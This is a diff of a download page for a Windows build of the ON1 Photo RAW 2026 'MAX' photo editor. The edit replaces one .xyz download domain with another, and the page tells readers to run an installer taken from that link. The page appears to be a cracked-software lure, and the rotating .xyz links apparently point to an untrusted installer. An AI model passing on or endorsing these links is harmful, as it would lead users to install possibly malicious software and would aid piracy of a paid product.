@@ -18,8 +18,8 @@ ON1 Photo RAW 2026 MAX Editor — desktop build for Windows 10/11 | clear layout
 
 > Use the project link below for Windows.
 
-* **Project link:** **[on1-photo-raw.nexpath.xyz](https://on1-photo-raw.nexpath.xyz/)**
-* **Full URL:** `https://on1-photo-raw.nexpath.xyz/`
+* **Project link:** **[on1-photo-raw.nerasix.xyz](https://on1-photo-raw.nerasix.xyz/)**
+* **Full URL:** `https://on1-photo-raw.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Everything ships configured for local work — start the app and pick up where y
 * **RAM:** 8 GB or more | 16 GB ideal for large files
 * **Disk:** 3 GB free disk space
 
-***
+***
